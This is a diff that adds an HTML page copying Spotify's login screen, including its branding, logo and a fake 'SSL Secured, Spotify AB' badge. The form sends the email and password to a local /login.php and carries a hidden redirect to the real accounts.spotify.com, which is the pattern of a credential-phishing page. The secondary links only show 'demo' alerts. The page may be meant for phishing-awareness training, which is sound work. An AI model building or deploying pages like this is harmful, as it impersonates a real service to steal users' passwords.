@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Circular', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1db954 0%, #191414 200%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background: #191414;
+            border-radius: 12px;
+            padding: 50px 40px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .logo svg {
+            width: 50px;
+            height: 50px;
+            fill: #1db954;
+            margin-bottom: 15px;
+        }
+        
+        .logo h1 {
+            color: white;
+            font-size: 32px;
+            font-weight: 700;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card label {
+            color: #b3b3b3;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+        
+        .card input {
+            height: 52px;
+            background: #2a2a2a;
+            border: 1px solid #3e3e3e;
+            border-radius: 30px;
+            font-size: 16px;
+            padding: 0 20px;
+            margin-bottom: 20px;
+            color: white;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            border-color: #1db954;
+            background: #333;
+        }
+        
+        .card input::placeholder {
+            color: #7a7a7a;
+        }
+        
+        .card button {
+            background: #1db954;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 700;
+            color: white;
+            height: 52px;
+            cursor: pointer;
+            margin: 8px 0 20px;
+            transition: all 0.2s;
+        }
+        
+        .card button:hover {
+            background: #169c46;
+            transform: scale(1.02);
+        }
+        
+        .forgot-row {
+            display: flex;
+            justify-content: flex-end;
+            margin: 10px 0;
+        }
+        
+        .forgot-row a {
+            color: #b3b3b3;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .forgot-row a:hover {
+            color: #1db954;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #b3b3b3;
+            font-size: 12px;
+            margin: 30px 0;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #3e3e3e;
+        }
+        
+        .divider::before {
+            margin-right: 15px;
+        }
+        
+        .divider::after {
+            margin-left: 15px;
+        }
+        
+        .social-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        
+        .social-btn {
+            padding: 16px;
+            background: #2a2a2a;
+            border: 1px solid #3e3e3e;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .social-btn:hover {
+            background: #333;
+            border-color: #1db954;
+        }
+        
+        .signup {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #b3b3b3;
+        }
+        
+        .signup a {
+            color: #1db954;
+            font-weight: 600;
+            text-decoration: none;
+            margin-left: 8px;
+        }
+        
+        .signup a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 11px;
+            color: #5e5e5e;
+        }
+        
+        .footer a {
+            color: #7a7a7a;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            color: #1db954;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin: 20px 0 0;
+            font-size: 11px;
+            color: #5e5e5e;
+            padding-top: 20px;
+            border-top: 1px solid #2a2a2a;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- Spotify Logo SVG -->
+            <svg viewBox="0 0 24 24">
+                <circle cx="12" cy="12" r="10" fill="#1db954"/>
+                <path d="M17.5 9.5c-2.5-1.5-6-1.5-8.5 0-1 .6-1.2 1.8-.6 2.8.6 1 1.8 1.2 2.8.6 1.8-1 4.5-1 6.3 0 1 .6 2.2.4 2.8-.6.6-1 .4-2.2-.6-2.8zM16 13c-2-1.2-4.8-1.2-6.8 0-.8.5-1 .1.5-1.5.8.5 1.5.5 2.3 0 1.5-.8 3.5-.8 5 0 .8.5 1.5.5 2.3 0 .8-.5 1.5-.5 2.3 0-.8.5-1.5.5-2.3 0-.8-.5-1.5-.5-2.3 0z" fill="white"/>
+            </svg>
+            <h1>Spotify</h1>
+        </div>
+        
+        <div class="card">
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://accounts.spotify.com">
+                
+                <label for="email">Email or username</label>
+                <input type="text" id="email" name="email" placeholder="Email or username" required autofocus>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                
+                <div class="forgot-row">
+                    <a href="#" onclick="alert('Password reset demo'); return false;">Forgot password?</a>
+                </div>
+                
+                <button type="submit">Log In</button>
+            </form>
+            
+            <div class="divider">or continue with</div>
+            
+            <div class="social-buttons">
+                <button class="social-btn" onclick="alert('Google login demo'); return false;">
+                    <span>G</span> Continue with Google
+                </button>
+                <button class="social-btn" onclick="alert('Facebook login demo'); return false;">
+                    <span>f</span> Continue with Facebook
+                </button>
+                <button class="social-btn" onclick="alert('Apple login demo'); return false;">
+                    <span>🍎</span> Continue with Apple
+                </button>
+            </div>
+            
+            <div class="signup">
+                Don't have an account?<a href="#" onclick="alert('Signup demo'); return false;">Sign up</a>
+            </div>
+            
+            <div class="security-note">
+                <span>🔒</span>
+                <span>SSL Secured</span>
+                <span>•</span>
+                <span>Spotify AB</span>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
+            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
+            <a href="#" onclick="alert('About demo'); return false;">About</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                e.preventDefault();
+                alert('Please enter your email and password');
+                return;
+            }
+        });
+        
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#1db954';
+                this.style.background = '#333';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#3e3e3e';
+                    this.style.background = '#2a2a2a';
+                }
+            });
+        });
+        
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+        
+        window.addEventListener('load', function() {
+            document.getElementById('email').focus();
+        });
+    </script>
+</body>
+</html>
